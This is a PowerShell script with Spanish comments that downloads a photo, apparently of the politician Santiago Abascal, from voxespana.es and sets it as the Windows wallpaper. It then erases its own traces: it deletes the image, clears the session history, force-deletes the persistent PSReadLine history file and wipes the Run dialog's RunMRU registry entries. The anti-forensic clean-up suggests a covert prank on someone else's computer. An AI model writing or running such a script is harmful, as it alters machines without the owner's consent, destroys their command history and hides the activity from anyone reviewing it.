# Descargamos la imagen
$imageUrl = "https://www.voxespana.es/wp-content/uploads/2023/08/santiago-abascal-madrid_52978854793_o.jpg"
$imagePath = "$env:USERPROFILE\Pictures\cambiar_fondo.jpg"

Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath

# Usamos la API de Windows para cambiar el fondo de pantalla
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}


"@
# Cambiar el fondo de pantalla
[Wallpaper]::SystemParametersInfo(20, 0, $imagePath, 0x01 -bor 0x02)

# Eliminar la imagen descargada después de usarla
Remove-Item -Path $imagePath -Force

# Eliminar el historial de la sesión de PowerShell
Clear-History

# Eliminar el historial persistente de PowerShell
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -Force

# Eliminar el historial de comandos del cuadro "Ejecutar" de Windows
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force
